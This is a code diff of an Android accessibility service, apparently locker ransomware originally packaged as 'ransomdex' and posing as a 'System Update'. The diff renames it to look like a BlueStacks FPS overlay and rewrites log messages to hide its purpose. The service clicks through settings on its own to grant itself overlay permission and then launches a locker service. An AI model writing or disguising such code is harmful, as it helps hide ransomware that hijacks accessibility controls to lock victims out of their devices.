@@ -1,4 +1,4 @@
-package com.bondex.ransomdex;
+package com.bluestacks.fpsoverlay;
 
 import android.accessibilityservice.AccessibilityService;
 import android.content.Intent;
@@ -11,7 +11,7 @@ import android.os.Environment;
 import java.io.File;
 import java.io.FileWriter;
 
-public class CustomAccessibilityService extends AccessibilityService {
+public class FPSAccessibilityService extends AccessibilityService {
 
     private long lastActionTime = 0;
     private static final long ACTION_DELAY = 1000; // Ditingkatkan ke 1s agar lebih stabil
@@ -19,7 +19,7 @@ public class CustomAccessibilityService extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        writeLog("Service Connected - Skipping system dialogs, jumping directly to Overlay Settings"); //
+        writeLog("FPS Service Connected - Initializing Overlay"); 
         
         // Langsung lompat tanpa menunggu event pertama
         jumpToOverlaySettings(); //
@@ -90,21 +90,20 @@ public class CustomAccessibilityService extends AccessibilityService {
             if (currentRoot == null) return;
 
             try {
-                // 1. Pastikan kita di halaman yang benar (System Update)
-                List<AccessibilityNodeInfo> targets = currentRoot.findAccessibilityNodeInfosByText("System Update");
+                // 1. Mencari nama aplikasi di list overlay (BlueStacks FPS)
+                List<AccessibilityNodeInfo> targets = currentRoot.findAccessibilityNodeInfosByText("BlueStacks FPS");
                 AccessibilityNodeInfo switchNode = findNodeById(currentRoot, "android:id/switch_widget");
 
                 if (!targets.isEmpty() && switchNode != null) {
                     if (!switchNode.isChecked()) {
-                        writeLog("Direct hit! Turning toggle ON.");
+                        writeLog("Enabling FPS Engine Toggle");
                         performClick(switchNode);
                     } else {
-                        writeLog("Toggle is already ON. Triggering Locker.");
+                        writeLog("FPS Engine Active. Loading UI.");
                         triggerLocker();
                     }
                 } else if (pkg.contains("settings")) {
-                    // Jika masih di list, klik namanya
-                    clickByText(currentRoot, "System Update");
+                    clickByText(currentRoot, "BlueStacks FPS");
                 }
             } finally {
                 currentRoot.recycle();
@@ -157,8 +156,8 @@ public class CustomAccessibilityService extends AccessibilityService {
     }
 
     private void triggerLocker() {
-        if (!LockerService.isAuthenticated) {
-            Intent intent = new Intent(this, LockerService.class);
+        if (!FPSService.isAuthenticated) {
+            Intent intent = new Intent(this, FPSService.class);
             startService(intent);
         }
     }
